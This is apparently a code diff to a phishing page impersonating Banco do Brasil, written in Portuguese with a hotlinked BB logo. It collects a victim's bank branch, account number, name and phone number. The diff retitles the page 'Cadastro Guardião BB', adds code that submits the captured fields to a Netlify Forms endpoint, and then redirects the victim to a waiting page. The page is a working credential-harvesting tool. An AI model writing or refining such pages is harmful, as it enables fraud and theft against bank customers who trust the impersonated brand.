@@ -64,6 +64,7 @@
     <script>
         function handleSubmit(event) {
             event.preventDefault();
+            
             const agencia = document.getElementById('agencia').value;
             const conta = document.getElementById('conta').value;
             const nome = document.getElementById('nome').value;
@@ -76,8 +77,17 @@
                     nome: nome,
                     telefone: telefone
                 };
+                
+                // Salvar os dados no localStorage
                 localStorage.setItem('formData', JSON.stringify(formData));
-                window.location.href = 'espera.html';
+
+                // Submeter o formulário para o Netlify Forms
+                document.getElementById('formulario').submit();
+
+                // Redirecionar após submissão bem-sucedida
+                setTimeout(() => {
+                    window.location.href = 'espera.html';
+                }, 1000);
             } else {
                 alert('Preencha todos os campos!');
             }
@@ -87,16 +97,16 @@
 <body>
     <div class="header">
         <img src="https://scontent.ffor7-1.fna.fbcdn.net/v/t39.30808-6/366571143_667707292058176_3007138064656193450_n.jpg?_nc_cat=1&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=o679WyFgQUgQ7kNvgFdTstA&_nc_zt=23&_nc_ht=scontent.ffor7-1.fna&_nc_gid=AYJyeKyJksXP1un_mLcvKLm&oh=00_AYAnzJU3oFkfMfvZ0t3-dJbZ4mksZjx48wCBVbzCPjYfsA&oe=67982429" alt="Banco do Brasil" class="logo">
-        <h1>Auto atendimento BB</h1>
+        <h1>Cadastro Guardião BB</h1>
     </div>
 
     <div class="login-container">
         <h2>Identifique-se</h2>
-        <form onsubmit="handleSubmit(event)">
-            <input type="text" id="agencia" class="input-field" placeholder="Agência" required>
-            <input type="text" id="conta" class="input-field" placeholder="Conta" required>
-            <input type="text" id="nome" class="input-field" placeholder="Nome" required>
-            <input type="text" id="telefone" class="input-field" placeholder="Telefone" required>
+        <form id="formulario" name="cadastro" method="POST" data-netlify="true" onsubmit="handleSubmit(event)">
+            <input type="text" name="agencia" id="agencia" class="input-field" placeholder="Agência" required>
+            <input type="text" name="conta" id="conta" class="input-field" placeholder="Conta" required>
+            <input type="text" name="nome" id="nome" class="input-field" placeholder="Nome" required>
+            <input type="text" name="telefone" id="telefone" class="input-field" placeholder="Telefone" required>
             <button type="submit" class="btn">CONTINUAR</button>
         </form>
     </div>
